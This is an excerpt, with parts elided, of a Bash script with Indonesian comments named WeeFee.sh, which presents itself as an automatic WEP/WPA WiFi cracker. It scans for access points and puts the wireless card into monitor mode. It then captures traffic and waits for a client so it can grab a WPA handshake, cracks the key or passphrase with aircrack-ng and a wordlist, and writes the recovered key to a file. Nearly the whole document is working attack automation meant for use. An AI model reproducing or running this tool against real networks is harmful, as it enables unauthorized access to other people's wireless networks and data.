...
############################################################################
# Script ini berfungsi untuk melakukan cracking WiFi passphrase secara     #
# otomatis                                                                 #
############################################################################
...
cariAP() {
   iwlist $interface scan > /tmp/weefee.tmp
   arrayESSID=( $(cat /tmp/weefee.tmp | awk -F":" '/ESSID/{print $2}') )
   arrayBSSID=( $(cat /tmp/weefee.tmp | grep "Address:" | awk '{print $5}\') )
   arrayChannel=( $(cat /tmp/weefee.tmp | grep "Channel:" | tr ':' ' ' | awk '{print $2}\') )
   arrayProtected=( $(cat /tmp/weefee.tmp | grep "key:" | sed 's/.*key://g') )
   arrayQuality=( $(cat /tmp/weefee.tmp | grep "Quality" | sed 's/.*Quality=//g' | awk -F " " '{print $1}' ) )
   id=""
   index="0"
   for item in "${arrayBSSID[@]}"; do
      if [ "$bssid" ] && [ "$bssid" == "$item" ] ; then id="$index" ;fi
      command=$(cat /tmp/weefee.tmp | sed -n "/$item/, +20p" | grep "WPA" )
      if [ "$command" ] ; then arrayEncryption[$index]="WPA"
         elif [ ${arrayProtected[$index]} == "off" ] ; then arrayEncryption[$index]="N/A"
         else arrayEncryption[$index]="WEP"
      fi
      index=$(($index+1))
   done
#------------------------------ESSID BER-SPASI------------------------------#
   cat /tmp/weefee.tmp | awk -F":" '/ESSID/{print $2}' | sed 's/\"//' | sed 's/\(.*\)\"/\1/' > /tmp/weefee.ssid
   index="0"
   while read line ; do
      if [ "$essid" ] && [ "$essid" == "$line" ] ; then id="$index" ;  fi
      arrayESSID[$index]="$line"
      index=$(($index+1))
   done < "/tmp/weefee.ssid"
   aksi "Menghapus file temporer" "rm -f /tmp/weefee.ssid" "true"
}
...
aksi() {
   ...
   if [ "$error" == "free" ] ; then
      ...
      $xterm -geometry 100x25+0+0 -T "weefee versi $versi - $1" -e "$command" # line+x+y
      return 0
   else
      echo -e "ERROR *_*"
      return 1
...
cariClient () {
   ...
   if [ "$error" == "free" ] ; then
      client=""
      aksi "Menghapus file temporer" "rm -f /tmp/weefee.dump* && sleep 1" "true"
      aksi "Menjalankan airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/weefee.dump --output-format netxml $monitorInterface" "true" &
      sleep 3
#------------------------------KONDISI ENKRIPSI------------------------------#
      if [ "$1" == "WEP" ] || [ "$1" == "N/A" ] ; then
         sleep 3
         client=$(cat "/tmp/weefee.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
      elif [ "$1" == "WPA" ] ; then
         while [ -z "$client" ] ; do
            sleep 2
            client=$(cat "/tmp/weefee.dump-01.kismet.netxml" | grep "client-mac" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/' | head -1)
...
#------------------------------KONDISI ESSID------------------------------#
      if [ -z "$essid" ] ; then
         essid=$(cat "/tmp/weefee.dump-01.kismet.netxml" | grep "<essid cloaked=\"false\">" | tr -d '\t' | sed 's/^<.*>\([^<].*\)<.*>$/\1/')
      fi
#------------------------------KONDISI AIRODUMP-NG------------------------------#
      ...
      aksi "Menghapus file temporer" "rm -f /tmp/weefee.dump*" "true"
      sleep 3
...
#------------------------------FILE .CAP------------------------------#
   tmp=$(ls /tmp/weefee-*.cap 2> /dev/null)
   if [ "$tmp" ] ; then command="$command /tmp/weefee-*" ; fi
#------------------------------FILE .NETXML------------------------------#
   tmp=$(ls /tmp/weefee.dump*.netxml 2> /dev/null)
   if [ "$tmp" ] ; then command="$command /tmp/weefee.dump*" ; fi
#------------------------------FILE weefee-----------------------------#
   tmp=$(ls replay_arp*.cap 2> /dev/null)
   if [ "$tmp" ] ; then command="$command replay_arp*.cap" ; fi
   if [ -e "/tmp/weefee.key" ] ; then command="$command /tmp/weefee.key" ; fi
   if [ -e "/tmp/weefee.tmp" ] ; then command="$command /tmp/weefee.tmp" ; fi
   if [ -e "/tmp/weefee.conf" ] ; then command="$command /tmp/weefee.conf" ; fi
   if [ -e "/tmp/weefee.handshake" ] ; then command="$command /tmp/weefee.handshake" ; fi
   if [ -e "/tmp/weefee.lst" ] ; then command="$command /tmp/weefee.lst" ; fi
   if [ -e "/tmp/weefee.dic" ] ; then command="$command /tmp/weefee.dic" ; fi
...
#------------------------------PROGRAM BERJALAN------------------------------#
##############################################################################
echo -e "WeeFee.sh --- Versi $versi
Automatic WEP/WPA Cracker by t193r"
...
if [ "$(id -u)" != "0" ] ; then
   tampil error "Jalankan script ini sebagai root." 1>&2
   cleanup nonuser
fi
#------------------------------Menghapus File Temporer------------------------------#
...
if [ "$(dpkg -l | awk '{print $2}' | grep -w aircrack-ng)" == "" ]; then
...
aksi "Monitor Mode (Berjalan)" "airmon-ng start $interface | awk '/monitor mode enabled on/ {print \$5}' | tr -d '\011' | sed -e \"s/(monitor mode enabled on //\" | sed 's/\(.*\)./\1/' > /tmp/weefee.tmp" "true"
sleep 2
command=$(ifconfig -a | grep $monitorInterface | awk '{print $1}')
if [ "$command" != "$monitorInterface" ] ; then
   sleep 3
...
aksi "Menghapus file temporer" "rm -f /tmp/weefee* && sleep 1" "true"
aksi "airodump-ng" "airodump-ng --bssid $bssid --channel $channel --write /tmp/weefee --output-format cap $monitorInterface" "true" "0|0|13" &
sleep 3
#------------------------------ATTACK WEP------------------------------#
...
#------------------------------ATTACK WPA------------------------------#
      ...
      loop="0"
      echo "blusp10it" > /tmp/weefee.tmp
      for (( i ; ; )) ; do
         aksi "aircrack-ng" "aircrack-ng /tmp/weefee*.cap -w /tmp/weefee.tmp -e \"$essid\" > /tmp/weefee.handshake" "true"
         command=$(cat /tmp/weefee.handshake | grep "Passphrase not in dictionary")
...
#------------------------------ENKRIPSI WEP------------------------------#
   if [ "$encryption" == "WEP" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/weefee*.cap -e \"$essid\" -l /tmp/weefee.key" "false" "0|350|30" ; fi
#------------------------------ENKRIPSI WPA------------------------------#
   if [ "$encryption" == "WPA" ] ; then aksi "aircrack-ng" "aircrack-ng /tmp/weefee*.cap -w $wordlist -e \"$essid\" -l /tmp/weefee.key" "false" "0|0|20" ; fi
fi
#------------------------------SELESAI CRACKING------------------------------#
aksi "Menutup semua proses" "killall xterm && sleep 3" "true"
...
#------------------------------TESTING KEY------------------------------#
if [ -e "/tmp/weefee.key" ] ; then
   key=$(cat /tmp/weefee.key)
...
BSSID = $bssid
  KEY = $key
Are you blusp10it?" >> /root/weefee.key
   loop="true"
   while [ $loop != "false" ] ; do
...
#------------------------------KEY Tidak Ditemukan, Memindahkan Handshake------------------------------#
      ...
      tampil aksi "Memindahkan handshake: $(pwd)/weefee-$essid.cap" 1>&2
      aksi "Memindahkan paket tangkapan" "mv -f /tmp/weefee*.cap $(pwd)/weefee-$essid.cap" "true"
#------------------------------ERROR------------------------------#
